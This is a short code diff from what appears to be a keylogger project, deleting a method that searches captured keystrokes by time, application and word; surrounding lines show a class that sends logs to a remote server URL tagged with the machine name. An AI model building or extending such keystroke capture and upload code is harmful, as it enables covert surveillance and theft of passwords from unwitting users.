@@ -67,20 +67,6 @@ class KeyLoggerService:
                     result.append(f"[{time_key}] ({entry['app']}): {entry['key']}")
         return "\n".join(result)
 
-    def search_logs(self, time=None, app=None, word=None):
-        result = []
-        for log_dict in self.all_logs:
-            for time_key, entries in log_dict.items():
-                if time and time not in time_key:
-                    continue
-                for entry in entries:
-                    if app and app.lower() not in entry['app'].lower():
-                        continue
-                    if word and word.lower() not in entry['key'].lower():
-                        continue
-                    result.append(f"[{time_key}] ({entry['app']}): {entry['key']}")
-        return "\n".join(result) if result else "No matching logs found."
-
 class ServerSender:
     def __init__(self, server_url, service, machine_name=platform.node()):
         self.server_url = server_url
